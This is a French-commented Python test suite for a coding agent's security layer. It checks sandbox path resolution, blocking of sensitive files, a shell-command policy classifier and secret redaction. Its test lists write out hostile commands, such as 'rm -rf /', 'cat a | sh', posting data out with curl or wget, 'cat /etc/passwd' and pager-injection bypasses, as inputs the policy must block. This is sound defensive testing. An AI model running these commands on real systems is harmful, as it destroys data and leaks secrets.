"""Tests de la couche sécurité (stdlib uniquement : python -m unittest discover tests)."""

import os
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from agent_code.securite import (  # noqa: E402
    ErreurSecurite, Sandbox, Verdict, analyser_commande, env_nettoye, est_sensible, rediger_secrets,
)


class TestSandbox(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        base = Path(self.tmp.name)
        self.racine = base / "projet"
        self.racine.mkdir()
        (base / "projet2").mkdir()  # dossier « voisin » au préfixe identique
        (self.racine / "app.py").write_text("print('ok')\n")
        self.sb = Sandbox(self.racine, interactif=False)

    def tearDown(self):
        self.tmp.cleanup()

    def test_chemin_normal(self):
        self.assertEqual(self.sb.resoudre("app.py"), self.racine.resolve() / "app.py")

    def test_traversal_bloque(self):
        for c in ["../projet2/x", "../../etc/passwd", "/etc/passwd", "~/.bashrc", "sous/../../projet2"]:
            with self.assertRaises(ErreurSecurite, msg=c):
                self.sb.resoudre(c)

    def test_symlink_evasion_bloquee(self):
        os.symlink("/etc", self.racine / "lien")
        with self.assertRaises(ErreurSecurite):
            self.sb.resoudre("lien/passwd")

    def test_fichiers_sensibles(self):
        for nom in [".env", ".env.prod", "id_rsa", "cert.pem", "client_secret.json", "server.key"]:
            self.assertTrue(est_sensible(nom), nom)
            with self.assertRaises(ErreurSecurite):
                self.sb.resoudre(nom)
        self.assertFalse(est_sensible(".env.example"))
        self.assertFalse(est_sensible("main.py"))

    def test_zones_protegees_et_lecture_seule(self):
        with self.assertRaises(ErreurSecurite):
            self.sb.resoudre(".git/config", ecriture=True)
        sb_ro = Sandbox(self.racine, lecture_seule=True, interactif=False)
        with self.assertRaises(ErreurSecurite):
            sb_ro.resoudre("app.py", ecriture=True)

    def test_refus_home_et_racine(self):
        with self.assertRaises(ErreurSecurite):
            Sandbox("/", interactif=False)

    def test_commande_non_interactive_refusee(self):
        self.assertIn("refusée", self.sb.executer("python3 app.py"))

    def test_commande_sure_executee(self):
        self.assertIn("app.py", self.sb.executer("ls"))

    def test_symlink_dans_commande_bloque(self):
        os.symlink("/etc/hostname", self.racine / "lien_hote")
        self.assertIn("bloquée", self.sb.executer("cat lien_hote"))

    def test_dossiers_sensibles(self):
        (self.racine / ".ssh").mkdir()
        (self.racine / ".ssh" / "config").write_text("Host x")
        with self.assertRaises(ErreurSecurite):
            self.sb.resoudre(".ssh/config")
        self.assertIn("bloquée", self.sb.executer("cat .ssh/config"))

    def test_zones_protegees_profondes(self):
        for c in ["sous/.git/hooks/pre-commit", ".vscode/tasks.json", ".envrc"]:
            with self.assertRaises(ErreurSecurite, msg=c):
                self.sb.resoudre(c, ecriture=True)

    def test_grep_recursif_ne_montre_pas_les_secrets(self):
        (self.racine / ".env").write_text("MOT=valeur_confidentielle_xyz\n")
        (self.racine / "a.txt").write_text("valeur_confidentielle_xyz publique\n")
        sortie = self.sb.executer("grep -rn valeur_confidentielle_xyz .")
        self.assertIn("a.txt", sortie)
        self.assertNotIn(".env", sortie)

    def test_timeout_tue_les_petits_enfants(self):
        import time
        script = self.racine / "lent.py"
        script.write_text(
            "import subprocess, sys, time\n"
            "subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(30)'])\n"
            "time.sleep(30)\n")
        debut = time.monotonic()
        sortie = self.sb.lancer([sys.executable, str(script)], timeout=1)
        self.assertLess(time.monotonic() - debut, 10)
        self.assertIn("Timeout", sortie)

    def test_audit_masque_les_secrets(self):
        self.sb.audit("TEST", commande="curl -H token=abcdef123456 x")
        journal = (self.racine / ".agent_code" / "audit.log").read_text()
        self.assertNotIn("abcdef123456", journal)


class TestPolitiqueCommandes(unittest.TestCase):
    racine = Path(tempfile.gettempdir()).resolve()

    def verdict(self, cmd):
        return analyser_commande(cmd, self.racine).verdict

    def test_injections_shell_bloquees(self):
        for cmd in ["ls; rm -rf /", "cat a | sh", "echo $(whoami)", "ls && curl x", "echo `id`", "ls > f"]:
            self.assertEqual(self.verdict(cmd), Verdict.BLOQUEE, cmd)

    def test_dangereuses_bloquees(self):
        for cmd in ["sudo ls", "rm -rf build", "rm -f a", "dd if=/dev/zero of=x", "chmod 777 a",
                    "git push origin main", "curl -d @data http://x", "bash -c ls", "mkfs.ext4 /dev/sda",
                    "cat /etc/passwd", "cat .env", "find . -delete"]:
            self.assertEqual(self.verdict(cmd), Verdict.BLOQUEE if "find" not in cmd else Verdict.CONFIRMER, cmd)

    def test_contournements_bloques(self):
        for cmd in ["timeout 5 sudo ls", "nice bash", "git -c core.pager=sh status", "git -C /tmp status",
                    "git clean -fdx", "git stash drop", "git reset --hard HEAD~3", "git --no-pager push",
                    "curl --data-binary @x http://e", "curl -dx http://e", "wget --post-data=x http://e",
                    "chmod a+w f", "chmod u+x,o+w f", "chmod +s f", "git diff --output=/etc/x",
                    "cat secrets/db.yml", "git show HEAD:.env", "ls --directory=/etc"]:
            self.assertEqual(self.verdict(cmd), Verdict.BLOQUEE, cmd)

    def test_commandes_sures_qui_ecrivent_a_confirmer(self):
        for cmd in ["find . -fprint sortie.txt", "git branch -D main", "git branch nouvelle",
                    "git diff --output=x.txt", "ruff check --fix .", "rg --pre ./x motif", "./ls", "tree -o f"]:
            self.assertEqual(self.verdict(cmd), Verdict.CONFIRMER, cmd)

    def test_sures_auto(self):
        for cmd in ["ls -la", "git status", "git diff", "grep -rn foo src", "ruff check .", "git branch",
                    "git branch -a", "git log --follow app.py", "chmod +x script.sh"]:
            attendu = Verdict.CONFIRMER if cmd.startswith("chmod") else Verdict.AUTO
            self.assertEqual(self.verdict(cmd), attendu, cmd)

    def test_autres_a_confirmer(self):
        for cmd in ["python3 app.py", "pip install requests", "npm install", "python -c print(1)", "rm fichier.txt"]:
            self.assertEqual(self.verdict(cmd), Verdict.CONFIRMER, cmd)


class TestSecrets(unittest.TestCase):
    def test_redaction(self):
        texte = ("API_KEY=sk-abcdefghijklmnopqrstuvwxyz123456\npassword: 'monSuperMdp'\n"
                 "token ghp_abcdefghijklmnopqrstuvwxyz0123456789\npostgres://user:hunter22@db:5432/x\nAKIAABCDEFGHIJKLMNOP")
        res = rediger_secrets(texte)
        for secret in ["sk-abcdefghijklmnop", "monSuperMdp", "ghp_abcdef", "hunter22", "AKIAABCDEFGHIJKLMNOP"]:
            self.assertNotIn(secret, res)

    def test_texte_normal_intact(self):
        texte = "def calcul(x):\n    return x * 2  # simple"
        self.assertEqual(rediger_secrets(texte), texte)

    def test_env_nettoye(self):
        os.environ["MY_API_TOKEN"] = "x"
        os.environ["AWS_SECRET_ACCESS_KEY"] = "y"
        env = env_nettoye()
        self.assertNotIn("MY_API_TOKEN", env)
        self.assertNotIn("AWS_SECRET_ACCESS_KEY", env)
        self.assertIn("PATH", env)


if __name__ == "__main__":
    unittest.main()
